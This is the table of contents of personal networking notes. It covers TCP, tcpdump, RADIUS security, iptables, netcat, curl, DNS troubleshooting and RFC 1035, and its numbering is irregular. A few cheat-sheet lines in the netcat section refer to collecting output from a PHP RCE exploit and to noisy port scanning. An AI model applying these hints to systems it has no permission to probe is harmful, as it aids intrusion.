.........................................Table Of Contents...............................................................
1. TCP <URL:#tn=1. TCP>
	1.1 TCP states <URL:#tn=	1.1 TCP states>
	1.2 Winsock FAQ <URL:#tn=	1.2 Winsock FAQ>
2. HTML <URL:#tn=2. HTML>
	2.1 HTML Tutorial <URL:#tn=	2.1 HTML Tutorial>
	    	2.1.1 Basic <URL:#tn=	    	2.1.1 Basic>
	    	    	2.1.1.1 Introduction <URL:#tn=	    	    	2.1.1.1 Introduction>
	    	    	2.1.1.2 HTML Elements <URL:#tn=	    	    	2.1.1.2 HTML Elements>
	    	    	2.1.1.3 Basic HTML Tags <URL:#tn=	    	    	2.1.1.3 Basic HTML Tags>
	    	    	2.1.1.4 <URL:#tn=	    	    	2.1.1.4>
		2.1.2 Advanced <URL:#tn=		2.1.2 Advanced>
2. Web Browsers <URL:#tn=2. Web Browsers>
3. Online APPs <URL:#tn=3. Online APPs>
4. EMAIL accounts <URL:#tn=4. EMAIL accounts>
	4.1 Gmail <URL:#tn=	4.1 Gmail>
		4.1.1  GMAIL tips, http://g04.com/misc/GmailTipsComplete.html#Tip-05 <URL:#tn=		4.1.1  GMAIL tips, http://g04.com/misc/GmailTipsComplete.html#Tip-05>
	4.2 <URL:#tn=	4.2>
5. Troubleshooting <URL:#tn=5. Troubleshooting>
	5.1 tcpdump <URL:#tn=	5.1 tcpdump>
		5.1.1 simple capture <URL:#tn=		5.1.1 simple capture>
		5.1.2 Filters <URL:#tn=		5.1.2 Filters>
			5.1.2.1  DNS <URL:#tn=			5.1.2.1  DNS>
			5.1.2.2 <URL:#tn=			5.1.2.2>
		5.1.3 http://www.wains.be/pub/networking/tcpdump_advanced_filters.txt <URL:#tn=		5.1.3 http://www.wains.be/pub/networking/tcpdump_advanced_filters.txt>
        0... = Reserved bit: Not set <URL:#tn=        0... = Reserved bit: Not set>
        0... .... = Congestion Window Reduced (CWR): Not set <URL:#tn=        0... .... = Congestion Window Reduced (CWR): Not set>
	5.2 <URL:#tn=	5.2>
6. Packet Guide to Core Network Protocols <URL:#tn=6. Packet Guide to Core Network Protocols>
	6.1 Chapter 1. Networking Models <URL:#tn=	6.1 Chapter 1. Networking Models>
		6.1.1 Section 1.1. What Is a Model? <URL:#tn=		6.1.1 Section 1.1. What Is a Model?>
		6.1.2 Section 1.2. Why Use a Model? <URL:#tn=		6.1.2 Section 1.2. Why Use a Model?>
		6.1.3 Section 1.3. OSI Model <URL:#tn=		6.1.3 Section 1.3. OSI Model>
			6.1.3.1 OSI—Beyond the Layers <URL:#tn=			6.1.3.1 OSI—Beyond the Layers>
			6.1.3.2 OSI/ITU-T Protocols <URL:#tn=			6.1.3.2 OSI/ITU-T Protocols>
		6.1.4 Introducing TCP/IP <URL:#tn=		6.1.4 Introducing TCP/IP>
			6.1.4.1 TCP/IP and the RFCs <URL:#tn=			6.1.4.1 TCP/IP and the RFCs>
			6.1.4.2 The Practical Side of TCP/IP <URL:#tn=			6.1.4.2 The Practical Side of TCP/IP>
			6.1.4.3 Encapsulation <URL:#tn=			6.1.4.3 Encapsulation>
			6.1.4.4 Addressing <URL:#tn=			6.1.4.4 Addressing>
			6.1.4.5 Equipment <URL:#tn=			6.1.4.5 Equipment>
		6.1.5 Section 1.5. Reading <URL:#tn=		6.1.5 Section 1.5. Reading>
		6.1.6 Section 1.6. Summary <URL:#tn=		6.1.6 Section 1.6. Summary>
		6.1.7 Section 1.7. Review Questions <URL:#tn=		6.1.7 Section 1.7. Review Questions>
		6.1.8 Section 1.8. Review Answers <URL:#tn=		6.1.8 Section 1.8. Review Answers>
		6.1.9 Section 1.9. Lab Exercises <URL:#tn=		6.1.9 Section 1.9. Lab Exercises>
			6.1.9.1 Activity 1—Examining Encapsulation <URL:#tn=			6.1.9.1 Activity 1—Examining Encapsulation>
			6.1.9.2 Activity 2—Protocol Distribution <URL:#tn=			6.1.9.2 Activity 2—Protocol Distribution>
			6.1.9.3 Activity 3—Developing a Protocol/Architecture <URL:#tn=			6.1.9.3 Activity 3—Developing a Protocol/Architecture>
	6.2 Chapter 2. Ethernet <URL:#tn=	6.2 Chapter 2. Ethernet>
	        6.2.1 Preamble <URL:#tn=	        6.2.1 Preamble>
	        6.2.2 Source and Destination MAC Addresses <URL:#tn=	        6.2.2 Source and Destination MAC Addresses>
	        6.2.3 Control Field (Type) <URL:#tn=	        6.2.3 Control Field (Type)>
	        6.2.4 Data Field <URL:#tn=	        6.2.4 Data Field>
	        6.2.5 Frame Check Sequence <URL:#tn=	        6.2.5 Frame Check Sequence>
			6.2.5.1 <URL:#tn=			6.2.5.1>
			6.2.5.2 <URL:#tn=			6.2.5.2>
7. Packet Guide to Routing and Switching <URL:#tn=7. Packet Guide to Routing and Switching>
	7.1 Routing and Switching Strategies <URL:#tn=	7.1 Routing and Switching Strategies>
		7.1. Switching: Forwarding and Filtering Traffic <URL:#tn=		7.1. Switching: Forwarding and Filtering Traffic>
		7.2. Routing: Finding Paths <URL:#tn=		7.2. Routing: Finding Paths>
		7.3. IPv6 <URL:#tn=		7.3. IPv6>
		7.4. Reading <URL:#tn=		7.4. Reading>
		7.5. Summary <URL:#tn=		7.5. Summary>
		7.6. Review Questions <URL:#tn=		7.6. Review Questions>
		7.7. Review Answers <URL:#tn=		7.7. Review Answers>
		7.8. Lab Activities <URL:#tn=		7.8. Lab Activities>
	7.2 Host Routing <URL:#tn=	7.2 Host Routing>
8. RADIUS <URL:#tn=8. RADIUS>
	8.1 FAQ <URL:#tn=	8.1 FAQ>
		8.1.1 Value of Calling-station-id ? <URL:#tn=		8.1.1 Value of Calling-station-id ?>
		8.1.2 <URL:#tn=		8.1.2>
	8.2 RADIUS From Wikipedia, the free encyclopedia <URL:#tn=	8.2 RADIUS From Wikipedia, the free encyclopedia>
	8.3 Securing RADIUS <URL:#tn=	8.3 Securing RADIUS>
		8.3.1 RADIUS/DTLS <URL:#tn=		8.3.1 RADIUS/DTLS>
			8.3.1.1 http://tools.ietf.org/html/draft-dekok-radext-dtls-03 <URL:#tn=			8.3.1.1 http://tools.ietf.org/html/draft-dekok-radext-dtls-03>
   7.2.2) is received.  Where the RADIUS specifications require that a <URL:#tn=   7.2.2) is received.  Where the RADIUS specifications require that a>
     2008. <URL:#tn=     2008.>
			8.3.1.2 RADIUS/TCP <URL:#tn=			8.3.1.2 RADIUS/TCP>
				8.3.1.2.1 http://tools.ietf.org/html/draft-ietf-radext-tcp-transport-09 <URL:#tn=				8.3.1.2.1 http://tools.ietf.org/html/draft-ietf-radext-tcp-transport-09>
          2000. <URL:#tn=          2000.>
				8.3.1.2.2 <URL:#tn=				8.3.1.2.2>
			8.3.1.3 <URL:#tn=			8.3.1.3>
		8.3.2 <URL:#tn=		8.3.2>
	8.4 <URL:#tn=	8.4>
9. Useful tools <URL:#tn=9. Useful tools>
	9.1 netstat <URL:#tn=	9.1 netstat>
	9.2 iptables <URL:#tn=	9.2 iptables>
		9.2.1  My examples <URL:#tn=		9.2.1  My examples>
			9.2.1.1  Block IP <URL:#tn=			9.2.1.1  Block IP>
			9.2.1.2 Allow access to DNS nameserver <URL:#tn=			9.2.1.2 Allow access to DNS nameserver>
			9.2.1.3 Block access to DNS nameserver <URL:#tn=			9.2.1.3 Block access to DNS nameserver>
			9.2.1.4 UnBlock access to DNS nameserver <URL:#tn=			9.2.1.4 UnBlock access to DNS nameserver>
			9.2.1.5 Required ports to communicate with Active-Directory Domain controller <URL:#tn=			9.2.1.5 Required ports to communicate with Active-Directory Domain controller>
			9.2.1.6 <URL:#tn=			9.2.1.6>
		9.2.2 25 most used iptables examples <URL:#tn=		9.2.2 25 most used iptables examples>
	9.3 telnet <URL:#tn=	9.3 telnet>
	9.4 netcat, nc <URL:#tn=	9.4 netcat, nc>
		9.4.1 Netcat cheat sheet <URL:#tn=		9.4.1 Netcat cheat sheet>
1. You may need the -p parameter to define the port; in most versions this is not required (nc -l -p 1337). <URL:#tn=1. You may need the -p parameter to define the port; in most versions this is not required (nc -l -p 1337).>
2. If you want to force netcat to stay listening after one connection you can use the -k flag. (nc -l -k 1337) <URL:#tn=2. If you want to force netcat to stay listening after one connection you can use the -k flag. (nc -l -k 1337)>
3. Using the -v (verbose) flag will make netcat output who is connecting (over stderr), this is good to know when using the -k flag because it is possible that there are different computers connecting to you. <URL:#tn=3. Using the -v (verbose) flag will make netcat output who is connecting (over stderr), this is good to know when using the -k flag because it is possible that there are different computers connecting to you.>
4. Flags can be parsed in a chain like this: "nc -lkv 1337". <URL:#tn=4. Flags can be parsed in a chain like this: "nc -lkv 1337".>
1. Adding the "-v" (verbose) flag is a nice check to see if a website is up. Here is an example: <URL:#tn=1. Adding the "-v" (verbose) flag is a nice check to see if a website is up. Here is an example:>
1. When using something like a PHP RCE exploit and you don't have a streaming connection through a shell it is useful to pipe the output to a file. Here is an example of how to do so: <URL:#tn=1. When using something like a PHP RCE exploit and you don't have a streaming connection through a shell it is useful to pipe the output to a file. Here is an example of how to do so:>
1. If you don't want multi tasked scanning which can be pretty extensive and noisy replace the "& done" for "; done". <URL:#tn=1. If you don't want multi tasked scanning which can be pretty extensive and noisy replace the "& done" for "; done".>
2. Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use. <URL:#tn=2. Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use.>
		9.4.2  netcat uses <URL:#tn=		9.4.2  netcat uses>
		9.4.3 netcat check if port is open <URL:#tn=		9.4.3 netcat check if port is open>
		9.4.4 8 Practical Linux Netcat NC Command Examples <URL:#tn=		9.4.4 8 Practical Linux Netcat NC Command Examples>
			9.4.4.1 Netcat in a Server-Client Architecture <URL:#tn=			9.4.4.1 Netcat in a Server-Client Architecture>
			9.4.4.2 Use Netcat to Transfer Files <URL:#tn=			9.4.4.2 Use Netcat to Transfer Files>
			9.4.4.3 Netcat Supports Timeouts <URL:#tn=			9.4.4.3 Netcat Supports Timeouts>
			9.4.4.4 Netcat Supports IPV6 Connectivity <URL:#tn=			9.4.4.4 Netcat Supports IPV6 Connectivity>
			9.4.4.5 Disable Reading from STDIN in Netcat <URL:#tn=			9.4.4.5 Disable Reading from STDIN in Netcat>
			9.4.4.6 Force Netcat Server to Stay Up <URL:#tn=			9.4.4.6 Force Netcat Server to Stay Up>
			9.4.4.7 Configure Netcat Client to Stay Up after EOF <URL:#tn=			9.4.4.7 Configure Netcat Client to Stay Up after EOF>
			9.4.4.8 Use Netcat with UDP Protocol <URL:#tn=			9.4.4.8 Use Netcat with UDP Protocol>
		9.4.5 How To Use Netcat to Establish and Test TCP and UDP Connections on a VPS <URL:#tn=		9.4.5 How To Use Netcat to Establish and Test TCP and UDP Connections on a VPS>
			9.4.5.1 How To Use Netcat for Port Scanning <URL:#tn=			9.4.5.1 How To Use Netcat for Port Scanning>
			9.4.5.2 How To Communicate through Netcat <URL:#tn=			9.4.5.2 How To Communicate through Netcat>
			9.4.5.3 How To Send Files through Netcat <URL:#tn=			9.4.5.3 How To Send Files through Netcat>
			9.4.5.4 How To Use Netcat as a Simple Web Server <URL:#tn=			9.4.5.4 How To Use Netcat as a Simple Web Server>
		9.4.6 <URL:#tn=		9.4.6>
	9.5 curl <URL:#tn=	9.5 curl>
	    9.5.1 cheat-sheet <URL:#tn=	    9.5.1 cheat-sheet>
	    9.5.2 SAP CP <URL:#tn=	    9.5.2 SAP CP>
	        9.5.2.1 semantic <URL:#tn=	        9.5.2.1 semantic>
	            9.5.2.1.1 swagger <URL:#tn=	            9.5.2.1.1 swagger>
	            9.5.2.1.2 get site <URL:#tn=	            9.5.2.1.2 get site>
	            9.5.2.1.3 <URL:#tn=	            9.5.2.1.3>
	        9.5.2.2 <URL:#tn=	        9.5.2.2>
	    9.5.3 <URL:#tn=	    9.5.3>
	9.6 tcpdump <URL:#tn=	9.6 tcpdump>
        9.7 <URL:#tn=        9.7>
10. DNS <URL:#tn=10. DNS>
	10.1  DNS Troubleshooting in Linux <URL:#tn=	10.1  DNS Troubleshooting in Linux>
	10.2 Simple Network Troubleshooting <URL:#tn=	10.2 Simple Network Troubleshooting>
    10.2.1 Introduction <URL:#tn=    10.2.1 Introduction>
        10.2.1.10.2.1 Sources of Network Slowness <URL:#tn=        10.2.1.10.2.1 Sources of Network Slowness>
        10.2.1.10.2.2 Sources of a Lack of Connectivity <URL:#tn=        10.2.1.10.2.2 Sources of a Lack of Connectivity>
        10.2.1.10.2.3 Doing Basic Cable and Link Tests <URL:#tn=        10.2.1.10.2.3 Doing Basic Cable and Link Tests>
    10.2.2 Testing Your NIC <URL:#tn=    10.2.2 Testing Your NIC>
        10.2.2.10.2.1 Viewing Your Activated Interfaces <URL:#tn=        10.2.2.10.2.1 Viewing Your Activated Interfaces>
        10.2.2.10.2.2 Viewing All Interfaces <URL:#tn=        10.2.2.10.2.2 Viewing All Interfaces>
            10.2.2.10.2.2.10.2.1 DHCP Considerations <URL:#tn=            10.2.2.10.2.2.10.2.1 DHCP Considerations>
        10.2.2.10.2.3 Testing Link Status from the Command Line <URL:#tn=        10.2.2.10.2.3 Testing Link Status from the Command Line>
            10.2.2.10.2.3.10.2.1 Link Status Output from mii-tool <URL:#tn=            10.2.2.10.2.3.10.2.1 Link Status Output from mii-tool>
            10.2.2.10.2.3.10.2.2 Link Status Output from ethtool <URL:#tn=            10.2.2.10.2.3.10.2.2 Link Status Output from ethtool>
        10.2.2.10.2.4 Viewing NIC Errors <URL:#tn=        10.2.2.10.2.4 Viewing NIC Errors>
            10.2.2.10.2.4.10.2.1 Ifconfig Error Output <URL:#tn=            10.2.2.10.2.4.10.2.1 Ifconfig Error Output>
            10.2.2.10.2.4.10.2.2 ethtool Error Output <URL:#tn=            10.2.2.10.2.4.10.2.2 ethtool Error Output>
        10.2.2.10.2.5 netstat Error Output <URL:#tn=        10.2.2.10.2.5 netstat Error Output>
            10.2.2.10.2.5.10.2.1 Possible Causes of Ethernet Errors <URL:#tn=            10.2.2.10.2.5.10.2.1 Possible Causes of Ethernet Errors>
    10.2.3 How to See MAC Addresses <URL:#tn=    10.2.3 How to See MAC Addresses>
    10.2.4 Using ping to Test Network Connectivity <URL:#tn=    10.2.4 Using ping to Test Network Connectivity>
    10.2.5 Using telnet to Test Network Connectivity <URL:#tn=    10.2.5 Using telnet to Test Network Connectivity>
        10.2.5.10.2.1 Linux telnet Troubleshooting <URL:#tn=        10.2.5.10.2.1 Linux telnet Troubleshooting>
            10.2.5.10.2.1.10.2.1 Successful Connection <URL:#tn=            10.2.5.10.2.1.10.2.1 Successful Connection>
            10.2.5.10.2.1.10.2.2 Connection Refused Messages <URL:#tn=            10.2.5.10.2.1.10.2.2 Connection Refused Messages>
            10.2.5.10.2.1.10.2.3 telnet Timeout or Hanging <URL:#tn=            10.2.5.10.2.1.10.2.3 telnet Timeout or Hanging>
        10.2.5.10.2.2 telnet Troubleshooting Using Windows <URL:#tn=        10.2.5.10.2.2 telnet Troubleshooting Using Windows>
            10.2.5.10.2.2.10.2.1 Screen Goes Blank - Successful Connection <URL:#tn=            10.2.5.10.2.2.10.2.1 Screen Goes Blank - Successful Connection>
            10.2.5.10.2.2.10.2.2 "Connect Failed" Messages <URL:#tn=            10.2.5.10.2.2.10.2.2 "Connect Failed" Messages>
            10.2.5.10.2.2.10.2.3 telnet Timeout or Hanging <URL:#tn=            10.2.5.10.2.2.10.2.3 telnet Timeout or Hanging>
    10.2.6 Testing Web sites with the curl and wget Utilities <URL:#tn=    10.2.6 Testing Web sites with the curl and wget Utilities>
        10.2.6.10.2.1 Using curl <URL:#tn=        10.2.6.10.2.1 Using curl>
        10.2.6.10.2.2 Using wget <URL:#tn=        10.2.6.10.2.2 Using wget>
    10.2.7 The netstat Command <URL:#tn=    10.2.7 The netstat Command>
    10.2.8 The Linux iptables Firewall <URL:#tn=    10.2.8 The Linux iptables Firewall>
        10.2.8.10.2.1 How to Configure iptables Rules <URL:#tn=        10.2.8.10.2.1 How to Configure iptables Rules>
    10.2.9 Using traceroute to Test Connectivity <URL:#tn=    10.2.9 Using traceroute to Test Connectivity>
        10.2.9.10.2.1 Sample traceroute Output <URL:#tn=        10.2.9.10.2.1 Sample traceroute Output>
        10.2.9.10.2.2 Possible traceroute Messages <URL:#tn=        10.2.9.10.2.2 Possible traceroute Messages>
            10.2.9.10.2.2.10.2.1 Table 10.2.4-10.2.1: traceroute Return Code Symbols <URL:#tn=            10.2.9.10.2.2.10.2.1 Table 10.2.4-10.2.1: traceroute Return Code Symbols>
        10.2.9.10.2.3 traceroute Time Exceeded False Alarms <URL:#tn=        10.2.9.10.2.3 traceroute Time Exceeded False Alarms>
        10.2.9.10.2.4 traceroute Internet Slowness False Alarm <URL:#tn=        10.2.9.10.2.4 traceroute Internet Slowness False Alarm>
        10.2.9.10.2.5 traceroute Dies At The Router Just Before The Server <URL:#tn=        10.2.9.10.2.5 traceroute Dies At The Router Just Before The Server>
        10.2.9.10.2.6 Always Get a Bidirectional traceroute <URL:#tn=        10.2.9.10.2.6 Always Get a Bidirectional traceroute>
        10.2.9.10.2.7 ping and traceroute Troubleshooting Example <URL:#tn=        10.2.9.10.2.7 ping and traceroute Troubleshooting Example>
        10.2.9.10.2.8 traceroute Web sites <URL:#tn=        10.2.9.10.2.8 traceroute Web sites>
        10.2.9.10.2.9 Possible Reasons For Failed Traceroutes <URL:#tn=        10.2.9.10.2.9 Possible Reasons For Failed Traceroutes>
    10.2.10 Using MTR To Detect Network Congestion <URL:#tn=    10.2.10 Using MTR To Detect Network Congestion>
    10.2.11 Viewing Packet Flows with tcpdump <URL:#tn=    10.2.11 Viewing Packet Flows with tcpdump>
        10.2.11.10.2.1 Table 10.2.4-10.2.2 : Possible TCPdump Switches <URL:#tn=        10.2.11.10.2.1 Table 10.2.4-10.2.2 : Possible TCPdump Switches>
        10.2.11.10.2.2 Table 10.2.4-10.2.3 : Useful tcpdump Expressions <URL:#tn=        10.2.11.10.2.2 Table 10.2.4-10.2.3 : Useful tcpdump Expressions>
        10.2.11.10.2.3 Analyzing tcpdump files <URL:#tn=        10.2.11.10.2.3 Analyzing tcpdump files>
        10.2.11.10.2.4 Common Problems with tcpdump <URL:#tn=        10.2.11.10.2.4 Common Problems with tcpdump>
    10.2.12 Viewing Packet Flows with tshark <URL:#tn=    10.2.12 Viewing Packet Flows with tshark>
        10.2.12.10.2.1 Table 10.2.4-10.2.4 : Possible tshark Switches <URL:#tn=        10.2.12.10.2.1 Table 10.2.4-10.2.4 : Possible tshark Switches>
        10.2.12.10.2.2 Table 10.2.4-10.2.5 : Useful tshark Expressions <URL:#tn=        10.2.12.10.2.2 Table 10.2.4-10.2.5 : Useful tshark Expressions>
    10.2.13 Basic DNS Troubleshooting <URL:#tn=    10.2.13 Basic DNS Troubleshooting>
        10.2.13.10.2.1 Using nslookup to Test DNS <URL:#tn=        10.2.13.10.2.1 Using nslookup to Test DNS>
            10.2.13.10.2.1.10.2.1 Using nslookup to Check Your Web site Name <URL:#tn=            10.2.13.10.2.1.10.2.1 Using nslookup to Check Your Web site Name>
            10.2.13.10.2.1.10.2.2 Using nslookup To Check Your IP Address <URL:#tn=            10.2.13.10.2.1.10.2.2 Using nslookup To Check Your IP Address>
            10.2.13.10.2.1.10.2.3 Using nslookup to Query a Specific DNS Server <URL:#tn=            10.2.13.10.2.1.10.2.3 Using nslookup to Query a Specific DNS Server>
        10.2.13.10.2.2 Using the host Command to Test DNS <URL:#tn=        10.2.13.10.2.2 Using the host Command to Test DNS>
    10.2.14 Using nmap <URL:#tn=    10.2.14 Using nmap>
        10.2.14.10.2.1 Table 10.2.4-10.2.6 Commonly Used NMAP Options <URL:#tn=        10.2.14.10.2.1 Table 10.2.4-10.2.6 Commonly Used NMAP Options>
    10.2.15 Using netcat to Test Network Bandwidth <URL:#tn=    10.2.15 Using netcat to Test Network Bandwidth>
    10.2.16 Determining the Source of an Attack <URL:#tn=    10.2.16 Determining the Source of an Attack>
    10.2.17 Who Has Used My System? <URL:#tn=    10.2.17 Who Has Used My System?>
        10.2.17.10.2.1 The last Command <URL:#tn=        10.2.17.10.2.1 The last Command>
        10.2.17.10.2.2 The who Command <URL:#tn=        10.2.17.10.2.2 The who Command>
    10.2.18 Conclusion <URL:#tn=    10.2.18 Conclusion>
	10.2.18.1 Introduction <URL:#tn=	10.2.18.1 Introduction>
	10.2.18.2 Testing Your NIC <URL:#tn=	10.2.18.2 Testing Your NIC>
	10.2.18.3 How to See MAC Addresses <URL:#tn=	10.2.18.3 How to See MAC Addresses>
	10.2.18.4 Using ping to Test Network Connectivity <URL:#tn=	10.2.18.4 Using ping to Test Network Connectivity>
	10.2.18.5 Using telnet to Test Network Connectivity <URL:#tn=	10.2.18.5 Using telnet to Test Network Connectivity>
	10.2.18.6 Testing Web sites with the curl and wget Utilities <URL:#tn=	10.2.18.6 Testing Web sites with the curl and wget Utilities>
	10.2.18.7 The netstat Command <URL:#tn=	10.2.18.7 The netstat Command>
	10.2.18.8 The Linux iptables Firewall <URL:#tn=	10.2.18.8 The Linux iptables Firewall>
	10.2.18.9 Using traceroute to Test Connectivity <URL:#tn=	10.2.18.9 Using traceroute to Test Connectivity>
	10.2.18.10 Using MTR To Detect Network Congestion <URL:#tn=	10.2.18.10 Using MTR To Detect Network Congestion>
	10.2.18.11 Viewing Packet Flows with tcpdump <URL:#tn=	10.2.18.11 Viewing Packet Flows with tcpdump>
	10.2.18.12 Viewing Packet Flows with tshark <URL:#tn=	10.2.18.12 Viewing Packet Flows with tshark>
	10.2.18.13 Basic DNS Troubleshooting <URL:#tn=	10.2.18.13 Basic DNS Troubleshooting>
	10.2.18.14 Using nmap <URL:#tn=	10.2.18.14 Using nmap>
	10.2.18.15 Using netcat to Test Network Bandwidth <URL:#tn=	10.2.18.15 Using netcat to Test Network Bandwidth>
	10.2.18.16 Determining the Source of an Attack <URL:#tn=	10.2.18.16 Determining the Source of an Attack>
	10.2.18.17 Who Has Used My System? <URL:#tn=	10.2.18.17 Who Has Used My System?>
	10.2.18.18 Conclusion <URL:#tn=	10.2.18.18 Conclusion>
	10.3 RFCs <URL:#tn=	10.3 RFCs>
		10.3.1 http://tools.ietf.org/html/rfc1035  DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION <URL:#tn=		10.3.1 http://tools.ietf.org/html/rfc1035  DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION>
10.3.1.1. STATUS OF THIS MEMO <URL:#tn=10.3.1.1. STATUS OF THIS MEMO>
  10.3.1.1. STATUS OF THIS MEMO                                              1 <URL:#tn=  10.3.1.1. STATUS OF THIS MEMO                                              1>
  10.3.1.2. INTRODUCTION                                                     3 <URL:#tn=  10.3.1.2. INTRODUCTION                                                     3>
      10.3.1.2.1. Overview                                                   3 <URL:#tn=      10.3.1.2.1. Overview                                                   3>
      10.3.1.2.2. Common configurations                                      4 <URL:#tn=      10.3.1.2.2. Common configurations                                      4>
      10.3.1.2.3. Conventions                                                7 <URL:#tn=      10.3.1.2.3. Conventions                                                7>
          10.3.1.2.3.1. Preferred name syntax                                7 <URL:#tn=          10.3.1.2.3.1. Preferred name syntax                                7>
          10.3.1.2.3.2. Data Transmission Order                              8 <URL:#tn=          10.3.1.2.3.2. Data Transmission Order                              8>
          10.3.1.2.3.3. Character Case                                       9 <URL:#tn=          10.3.1.2.3.3. Character Case                                       9>
          10.3.1.2.3.4. Size limits                                         10 <URL:#tn=          10.3.1.2.3.4. Size limits                                         10>
  10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS                            10 <URL:#tn=  10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS                            10>
      10.3.1.3.1. Name space definitions                                    10 <URL:#tn=      10.3.1.3.1. Name space definitions                                    10>
      10.3.1.3.2. RR definitions                                            11 <URL:#tn=      10.3.1.3.2. RR definitions                                            11>
          10.3.1.3.2.1. Format                                              11 <URL:#tn=          10.3.1.3.2.1. Format                                              11>
          10.3.1.3.2.2. TYPE values                                         12 <URL:#tn=          10.3.1.3.2.2. TYPE values                                         12>
          10.3.1.3.2.3. QTYPE values                                        12 <URL:#tn=          10.3.1.3.2.3. QTYPE values                                        12>
          10.3.1.3.2.4. CLASS values                                        13 <URL:#tn=          10.3.1.3.2.4. CLASS values                                        13>
          10.3.1.3.2.5. QCLASS values                                       13 <URL:#tn=          10.3.1.3.2.5. QCLASS values                                       13>
      10.3.1.3.3. Standard RRs                                              13 <URL:#tn=      10.3.1.3.3. Standard RRs                                              13>
          10.3.1.3.3.1. CNAME RDATA format                                  14 <URL:#tn=          10.3.1.3.3.1. CNAME RDATA format                                  14>
          10.3.1.3.3.2. HINFO RDATA format                                  14 <URL:#tn=          10.3.1.3.3.2. HINFO RDATA format                                  14>
          10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL)                      14 <URL:#tn=          10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL)                      14>
          10.3.1.3.3.4. MD RDATA format (Obsolete)                          15 <URL:#tn=          10.3.1.3.3.4. MD RDATA format (Obsolete)                          15>
          10.3.1.3.3.5. MF RDATA format (Obsolete)                          15 <URL:#tn=          10.3.1.3.3.5. MF RDATA format (Obsolete)                          15>
          10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL)                      16 <URL:#tn=          10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL)                      16>
          10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL)                   16 <URL:#tn=          10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL)                   16>
          10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL)                      17 <URL:#tn=          10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL)                      17>
          10.3.1.3.3.9. MX RDATA format                                     17 <URL:#tn=          10.3.1.3.3.9. MX RDATA format                                     17>
          10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL)                   17 <URL:#tn=          10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL)                   17>
          10.3.1.3.3.11. NS RDATA format                                    18 <URL:#tn=          10.3.1.3.3.11. NS RDATA format                                    18>
          10.3.1.3.3.12. PTR RDATA format                                   18 <URL:#tn=          10.3.1.3.3.12. PTR RDATA format                                   18>
          10.3.1.3.3.13. SOA RDATA format                                   19 <URL:#tn=          10.3.1.3.3.13. SOA RDATA format                                   19>
          10.3.1.3.3.14. TXT RDATA format                                   20 <URL:#tn=          10.3.1.3.3.14. TXT RDATA format                                   20>
      10.3.1.3.4. ARPA Internet specific RRs                                20 <URL:#tn=      10.3.1.3.4. ARPA Internet specific RRs                                20>
          10.3.1.3.4.1. A RDATA format                                      20 <URL:#tn=          10.3.1.3.4.1. A RDATA format                                      20>
          10.3.1.3.4.2. WKS RDATA format                                    21 <URL:#tn=          10.3.1.3.4.2. WKS RDATA format                                    21>
      10.3.1.3.5. IN-ADDR.ARPA domain                                       22 <URL:#tn=      10.3.1.3.5. IN-ADDR.ARPA domain                                       22>
      10.3.1.3.6. Defining new types, classes, and special namespaces       24 <URL:#tn=      10.3.1.3.6. Defining new types, classes, and special namespaces       24>
  10.3.1.4. MESSAGES                                                        25 <URL:#tn=  10.3.1.4. MESSAGES                                                        25>
      10.3.1.4.1. Format                                                    25 <URL:#tn=      10.3.1.4.1. Format                                                    25>
          10.3.1.4.1.1. Header section format                               26 <URL:#tn=          10.3.1.4.1.1. Header section format                               26>
          10.3.1.4.1.2. Question section format                             28 <URL:#tn=          10.3.1.4.1.2. Question section format                             28>
          10.3.1.4.1.3. Resource record format                              29 <URL:#tn=          10.3.1.4.1.3. Resource record format                              29>
          10.3.1.4.1.4. Message compression                                 30 <URL:#tn=          10.3.1.4.1.4. Message compression                                 30>
      10.3.1.4.2. Transport                                                 32 <URL:#tn=      10.3.1.4.2. Transport                                                 32>
          10.3.1.4.2.1. UDP usage                                           32 <URL:#tn=          10.3.1.4.2.1. UDP usage                                           32>
          10.3.1.4.2.2. TCP usage                                           32 <URL:#tn=          10.3.1.4.2.2. TCP usage                                           32>
  10.3.1.5. MASTER FILES                                                    33 <URL:#tn=  10.3.1.5. MASTER FILES                                                    33>
      10.3.1.5.1. Format                                                    33 <URL:#tn=      10.3.1.5.1. Format                                                    33>
      10.3.1.5.2. Use of master files to define zones                       35 <URL:#tn=      10.3.1.5.2. Use of master files to define zones                       35>
      10.3.1.5.3. Master file example                                       36 <URL:#tn=      10.3.1.5.3. Master file example                                       36>
  10.3.1.6. NAME SERVER IMPLEMENTATION                                      37 <URL:#tn=  10.3.1.6. NAME SERVER IMPLEMENTATION                                      37>
      10.3.1.6.1. Architecture                                              37 <URL:#tn=      10.3.1.6.1. Architecture                                              37>
          10.3.1.6.1.1. Control                                             37 <URL:#tn=          10.3.1.6.1.1. Control                                             37>
          10.3.1.6.1.2. Database                                            37 <URL:#tn=          10.3.1.6.1.2. Database                                            37>
          10.3.1.6.1.3. Time                                                39 <URL:#tn=          10.3.1.6.1.3. Time                                                39>
      10.3.1.6.2. Standard query processing                                 39 <URL:#tn=      10.3.1.6.2. Standard query processing                                 39>
      10.3.1.6.3. Zone refresh and reload processing                        39 <URL:#tn=      10.3.1.6.3. Zone refresh and reload processing                        39>
      10.3.1.6.4. Inverse queries (Optional)                                40 <URL:#tn=      10.3.1.6.4. Inverse queries (Optional)                                40>
          10.3.1.6.4.1. The contents of inverse queries and responses       40 <URL:#tn=          10.3.1.6.4.1. The contents of inverse queries and responses       40>
          10.3.1.6.4.2. Inverse query and response example                  41 <URL:#tn=          10.3.1.6.4.2. Inverse query and response example                  41>
          10.3.1.6.4.3. Inverse query processing                            42 <URL:#tn=          10.3.1.6.4.3. Inverse query processing                            42>
      10.3.1.6.5. Completion queries and responses                          42 <URL:#tn=      10.3.1.6.5. Completion queries and responses                          42>
